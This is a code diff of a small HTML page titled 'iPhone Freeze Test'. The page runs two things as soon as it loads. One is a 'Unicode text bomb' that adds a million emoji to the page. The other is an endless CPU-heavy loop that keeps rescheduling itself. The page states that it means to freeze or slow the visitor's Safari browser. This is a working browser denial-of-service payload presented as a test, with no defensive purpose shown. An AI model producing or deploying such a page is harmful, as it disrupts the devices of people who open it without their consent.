@@ -1,20 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta charset="UTF-8">
   <title>iPhone Freeze Test</title>
 </head>
 <body>
-  <h1>Freeze Test</h1>
-  <p>If your browser freezes, the test worked.</p>
+  <h1>iPhone Safari Freeze Test</h1>
+  <p>If your Safari freezes or slows down, the test worked.</p>
 
   <script>
-    // Infinite loop to cause heavy CPU usage
-    setTimeout(function loop() {
+    // 1. Unicode text bomb
+    let bomb = "😈".repeat(500000) + "💥".repeat(500000);
+    document.body.innerHTML += "<p>" + bomb + "</p>";
+
+    // 2. Heavy CPU loop
+    function heavyLoad() {
       for (let i = 0; i < 1e8; i++) {
-        let a = new Array(10000).fill("Freeze!");
+        Math.sqrt(i);
       }
-      setTimeout(loop, 0);
-    }, 0);
+      setTimeout(heavyLoad, 0);
+    }
+    heavyLoad();
   </script>
 </body>
 </html>
